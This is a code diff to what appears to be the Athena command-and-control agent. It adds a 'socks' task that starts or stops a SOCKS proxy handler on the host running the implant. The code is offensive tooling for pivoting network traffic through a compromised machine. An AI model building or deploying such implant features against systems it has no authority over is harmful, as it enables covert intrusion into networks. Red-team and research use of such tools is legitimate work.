@@ -4,9 +4,9 @@ using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Linq;
 
 namespace Athena.Commands
 {
@@ -242,9 +242,55 @@ namespace Athena.Commands
                     job.hasoutput = true;
                     break;
                 case "socks":
+                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if (socksInfo["action"].ToString() =="start")
+                    {
+                        if (Globals.socksHandler == null)
+                        {
+                            Globals.socksHandler = new SocksHandler();
+                            Globals.socksHandler.Start();
+                        }
+                        else
+                        {
+                            if (Globals.socksHandler.running)
+                            {
+                                job.taskresult = "SocksHandler is already running.";
+                            }
+                            else
+                            {
+                                Globals.socksHandler.Start();
+                                job.taskresult = "Socks Started.";
+                            }
+                        }
+                    }
+                    else
+                    {
+                        try
+                        {
+                            job.taskresult = "Stopped";
+                            if (Globals.socksHandler != null)
+                            {
+                                Globals.socksHandler.Stop();
+                            }
+                            else
+                            {
+                                job.taskresult = "Socks is not running";
+                                job.errored = true;
+                                job.complete = true;
+                            }
+                        }
+                        catch
+                        {
+                            job.taskresult = "Socks is not running";
+                            job.errored = true;
+                            job.complete = true;
+                        }
+                    }
                     //SOCKS5 – A .NET CORE IMPLEMENTATION FROM SCRATCH
                     //https://blog.zhaytam.com/2019/11/15/socks5-a-net-core-implementation-from-scratch/
                     //https://gist.github.com/zHaytam/3730d512eb5eaf37fb3bd3d176185541
+                    job.complete = true;
+                    job.hasoutput = true;
                     break;
                 case "stop-assembly":
                     var stopAssemblyTask = Task.Run(() => {
